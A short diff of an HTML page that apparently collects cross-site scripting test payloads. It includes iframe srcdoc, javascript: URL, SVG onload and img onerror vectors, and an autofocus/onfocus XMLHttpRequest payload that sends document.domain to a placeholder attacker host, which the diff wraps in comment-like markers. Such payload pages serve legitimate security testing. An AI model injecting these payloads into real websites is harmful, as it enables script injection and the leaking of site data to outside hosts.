@@ -11,8 +11,12 @@
 <iframe src="" srcdoc="<script>alert("IFRAME XSS")</script>"></iframe>
 <iframe src="javascript:alert("JAVASCRIPT:")"></iframe>
 <svg </onload ="1> (_=prompt,_("SVGONLOAD"))"">
-"autofocus/onfocus="thr=new XMLHttpRequest();thr.open('GET','//[yourhost]/[yourhook].php?t=&d='+document.domain,true);thr.send(null);"//
-			x@x.com<--`<img/src=` onerror=alert("Friendly-XSS")> --!> </code></h1>
+<-- "autofocus/onfocus="thr=new XMLHttpRequest(); --!>
+			<-- thr.open('GET','//[yourhost]/[yourhook].php?t=&d='+document.domain,true); --!>
+			<-- thr.send(null);"//x@x.com --!>
+			<--`<img/src=` onerror=alert("Friendly-XSS")> --!> 
+			</code>
+		</h1>
 
 	<h2> [Special Edition]
 		
